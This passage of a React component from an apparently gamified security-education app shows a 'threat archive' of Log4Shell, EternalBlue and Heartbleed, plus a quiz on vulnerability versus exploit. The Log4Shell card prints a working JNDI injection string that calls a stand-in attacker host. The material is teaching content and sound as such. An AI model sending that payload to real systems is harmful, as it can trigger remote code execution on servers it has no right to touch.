              <span style={{ fontSize: '0.72rem', color: currentSensei.themeColor, fontFamily: 'var(--font-mono)' }}>
                S-RANK DIGITAL THREAT ARCHIVE
              </span>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '14px' }}>
              {/* Log4Shell */}
              <div style={{ background: 'rgba(9, 13, 23, 0.75)', border: '1px solid rgba(255, 42, 95, 0.4)', borderRadius: '8px', padding: '14px', fontSize: '0.82rem' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                  <strong style={{ color: 'var(--accent-red)', fontSize: '0.9rem' }}>Log4Shell (CVE-2021-44228)</strong>
                  <span style={{ color: 'var(--accent-red)', fontFamily: 'var(--font-mono)', fontWeight: 'bold' }}>CVSS 10.0 [S-RANK]</span>
                </div>
                <p style={{ color: 'var(--text-secondary)', lineHeight: '1.4', marginBottom: '8px' }}>
                  <strong style={{ color: '#fff' }}>Vulnerability:</strong> Apache Log4j evaluated untrusted JNDI expressions inside logs.<br/>
                  <strong style={{ color: '#fff' }}>Exploit:</strong> Sending <code>${'{'}jndi:ldap://attacker.com/a{'}'}</code> in a chat or header triggered instant remote code execution (RCE).
                </p>
                <div style={{ fontStyle: 'italic', fontSize: '0.75rem', color: currentSensei.themeColor, borderTop: '1px solid rgba(255,255,255,0.06)', paddingTop: '6px' }}>
                  💬 {currentSensei.name}: "An S-Rank forbidden catastrophe. A single line in chat grants root command!"
                </div>
              </div>

              {/* EternalBlue */}
              <div style={{ background: 'rgba(9, 13, 23, 0.75)', border: '1px solid rgba(255, 157, 0, 0.4)', borderRadius: '8px', padding: '14px', fontSize: '0.82rem' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                  <strong style={{ color: 'var(--accent-orange)', fontSize: '0.9rem' }}>EternalBlue (CVE-2017-0144)</strong>
                  <span style={{ color: 'var(--accent-orange)', fontFamily: 'var(--font-mono)', fontWeight: 'bold' }}>CVSS 9.8 [S-RANK]</span>
                </div>
                <p style={{ color: 'var(--text-secondary)', lineHeight: '1.4', marginBottom: '8px' }}>
                  <strong style={{ color: '#fff' }}>Vulnerability:</strong> Flaw in Microsoft Windows SMBv1 protocol packet handling.<br/>
                  <strong style={{ color: '#fff' }}>Exploit:</strong> Crafted SMB packets yielded Ring 0 kernel shell execution, weaponized in WannaCry ransomware.
                </p>
                <div style={{ fontStyle: 'italic', fontSize: '0.75rem', color: currentSensei.themeColor, borderTop: '1px solid rgba(255,255,255,0.06)', paddingTop: '6px' }}>
                  💬 {currentSensei.name}: "The National Security Agency held this secret weapon until the Shadow Brokers leaked it!"
                </div>
              </div>

              {/* Heartbleed */}
              <div style={{ background: 'rgba(9, 13, 23, 0.75)', border: '1px solid rgba(0, 240, 255, 0.4)', borderRadius: '8px', padding: '14px', fontSize: '0.82rem' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px' }}>
                  <strong style={{ color: 'var(--accent-cyan)', fontSize: '0.9rem' }}>Heartbleed (CVE-2014-0160)</strong>
                  <span style={{ color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)', fontWeight: 'bold' }}>CVSS 7.5 [A-RANK]</span>
                </div>
                <p style={{ color: 'var(--text-secondary)', lineHeight: '1.4', marginBottom: '8px' }}>
                  <strong style={{ color: '#fff' }}>Vulnerability:</strong> Missing bounds check in OpenSSL TLS Heartbeat extension.<br/>
                  <strong style={{ color: '#fff' }}>Exploit:</strong> Sending a spoofed heartbeat request leaked 64KB of server RAM, exposing SSL private keys and passwords.
                </p>
                <div style={{ fontStyle: 'italic', fontSize: '0.75rem', color: currentSensei.themeColor, borderTop: '1px solid rgba(255,255,255,0.06)', paddingTop: '6px' }}>
                  💬 {currentSensei.name}: "A silent memory leakage jutsu. The victim never even knows their private key was drained!"
                </div>
              </div>
            </div>
          </div>
        )}

        {/* TAB 4: SENSEI'S POP QUIZ */}
        {activeLessonTab === 'quiz' && (
          <div style={{ background: 'rgba(4, 7, 13, 0.8)', border: `1px solid ${currentSensei.themeColor}55`, borderRadius: '8px', padding: '20px' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
              <span style={{ fontSize: '1.4rem' }}>🎯</span>
              <h4 style={{ color: currentSensei.themeColor, fontSize: '1.05rem' }}>
                {currentSensei.name}'s Field Challenge: Test Your Understanding!
              </h4>
            </div>

            <p style={{ color: 'var(--text-primary)', fontSize: '0.92rem', marginBottom: '16px', lineHeight: '1.5' }}>
              "Genin! A system administrator installs a new database server. The software ships with a default password of <code>admin:admin</code> and leaves Port 3306 exposed to the public internet. No attacker has discovered or typed that password yet. <strong>What is this status?</strong>"
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', maxWidth: '520px' }}>
              <button
                onClick={() => handleQuizAnswer('exploit')}
                className="cyber-button"
                style={{
                  textAlign: 'left',
                  padding: '10px 16px',
                  borderColor: quizSelection === 'exploit' ? 'var(--accent-red)' : 'var(--border-color)',
                  color: quizSelection === 'exploit' ? 'var(--accent-red)' : 'var(--text-secondary)',
                  background: quizSelection === 'exploit' ? 'rgba(255,42,95,0.15)' : 'rgba(0,0,0,0.3)'
                }}
              >
                A) It is an Exploit (Weaponized Tool)
              </button>

              <button
                onClick={() => handleQuizAnswer('vuln')}
                className="cyber-button"
                style={{
                  textAlign: 'left',
                  padding: '10px 16px',
                  borderColor: quizSelection === 'vuln' ? 'var(--accent-green)' : 'var(--border-color)',
                  color: quizSelection === 'vuln' ? 'var(--accent-green)' : 'var(--text-secondary)',
                  background: quizSelection === 'vuln' ? 'rgba(57,255,20,0.15)' : 'rgba(0,0,0,0.3)'
                }}
              >
                B) It is a Vulnerability (The Passive Security Flaw)
              </button>

              <button
                onClick={() => handleQuizAnswer('zero_day')}
                className="cyber-button"
                style={{
                  textAlign: 'left',
                  padding: '10px 16px',
                  borderColor: quizSelection === 'zero_day' ? 'var(--accent-red)' : 'var(--border-color)',
                  color: quizSelection === 'zero_day' ? 'var(--accent-red)' : 'var(--text-secondary)',
                  background: quizSelection === 'zero_day' ? 'rgba(255,42,95,0.15)' : 'rgba(0,0,0,0.3)'
                }}
              >
                C) It is a Zero-Day Payload
              </button>
            </div>

            {/* Instant Sensei Feedback */}
            {quizSelection && (
              <div style={{ marginTop: '16px', padding: '14px 18px', borderRadius: '6px', background: quizSelection === 'vuln' ? 'rgba(57, 255, 20, 0.1)' : 'rgba(255, 42, 95, 0.1)', border: `1px solid ${quizSelection === 'vuln' ? 'var(--accent-green)' : 'var(--accent-red)'}` }}>
                {quizSelection === 'vuln' ? (
                  <div>
                    <div style={{ color: 'var(--accent-green)', fontWeight: 'bold', fontSize: '0.95rem', marginBottom: '4px' }}>
                      🌟 {currentSensei.name}: "Spot on! You have the tactical mind of a true Jōnin!"
                    </div>
                    <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem' }}>
                      Leaving <code>admin:admin</code> open is a passive configuration loophole (a <strong>Vulnerability</strong>). An attacker who writes an automated Python script to connect to that port and exfiltrate the customer database is executing the <strong>Exploit</strong>!
                    </p>
                  </div>
                ) : (
                  <div>
                    <div style={{ color: 'var(--accent-red)', fontWeight: 'bold', fontSize: '0.95rem', marginBottom: '4px' }}>
                      ⚠️ {currentSensei.name}: "Careful, Genin! Re-read the definition!"
                    </div>
                    <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem' }}>
                      The default password is not an exploit because nobody has taken any action or fired any script yet. It is purely a <strong>Vulnerability</strong> (a passive weakness waiting to be discovered). Try clicking option B!
                    </p>
                  </div>
                )}
              </div>
            )}
          </div>
        )}
      </section>
    </div>
  );
}
